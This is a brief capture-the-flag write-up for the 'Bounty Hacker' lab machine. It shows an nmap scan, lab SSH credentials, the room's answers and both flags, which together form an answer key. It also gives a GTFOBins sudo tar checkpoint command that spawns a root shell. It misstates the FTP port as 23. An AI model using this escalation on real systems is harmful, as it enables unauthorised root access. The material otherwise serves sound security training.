# Bounty Hacker
# By 0xRar

## machine_ip: *.*.*.*

## nmap scan:
```
Not shown: 969 filtered ports, 28 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.32.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## ports : 
```
ftp=23 anonymous login enabled
ssh=22 user: lin , password: RedDr4gonSynd1cat3
```


##  Who wrote the task list?:
```
From the task.txt
Answer: lin
```

## What service can you bruteforce with the text file found?:
```
Answer: ssh
```

## user.txt:
```
Answer: THM{CR1M3_SyNd1C4T3}
```

## priv esc
```
https://gtfobins.github.io/gtfobins/tar/
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

```

## root.txt:
```
Answer: THM{80UN7Y_h4cK3r}

```


```
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```
